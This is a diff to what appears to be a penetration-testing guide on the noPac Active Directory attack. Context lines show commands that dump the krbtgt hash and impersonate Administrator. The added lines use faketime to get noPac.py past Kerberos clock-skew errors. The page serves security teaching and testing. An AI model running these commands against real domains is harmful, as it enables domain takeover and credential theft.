@@ -81,6 +81,11 @@ KRB5CCNAME='DomainAdmin.ccache' secretsdump.py -just-dc-user 'krbtgt' -k -no-pas
 scanner.py $DOMAIN/$USERNAME:$PASSWORD -dc-ip $DC_IP
 noPac.py $DOMAIN/$USERNAME:$PASSWORD -dc-ip $DC_IP --impersonate Administrator -dump
 ```
+To bypass the time skew error (Clock skew too great) that often occurs with tools like noPac, using faketime can indeed be useful. faketime allows you to simulate a different date and time for a specific process. This can be used to make the noPac.py script believe that the machine’s time is synchronized with that of the Domain Controller (DC).
+
+```bash
+faketime "2024-10-11 15:30:00" ./noPac.py "$DOMAIN/$USERNAME:$PASSWORD" -dc-ip "$DC_IP" --impersonate "Administrator" -dump
+```
 
 > [!TIP]
 > When using [Impacket](https://github.com/SecureAuthCorp/impacket)'s addcomputer script for the creation of a computer account, the "SAMR" method is used by default (instead of the LDAPS one). At the time of writing (10th of December, 2021), the SAMR method creates the account without SPNs, which allows to skip step #1.
